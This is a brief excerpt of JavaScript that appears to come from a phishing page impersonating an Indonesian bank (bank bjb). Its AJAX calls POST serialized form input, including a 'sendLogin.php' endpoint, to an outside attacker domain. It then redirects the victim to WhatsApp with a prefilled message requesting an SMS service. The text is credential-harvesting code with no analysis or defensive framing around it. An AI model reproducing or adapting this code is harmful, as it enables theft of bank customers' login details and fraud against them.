 ...
 $.ajax({
 type: 'POST',
 url: 'https://axcellent.cf-pow.cfd/app5/no.php',
 data: $(this).serialize(),
 datatype: 'JSON', 
...
$.ajax({
 type: 'POST',
 url: 'https://axcellent.cf-pow.cfd/app5/sendLogin.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(), 
 complete: function(data) {
...
function go(){
setTimeout(function(){  
location.href='https://api.whatsapp.com/send?phone=62811114858&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯,%0ASaya mau request Pesan SMS ke layanan (83373)';
    }, 1500);    
}     
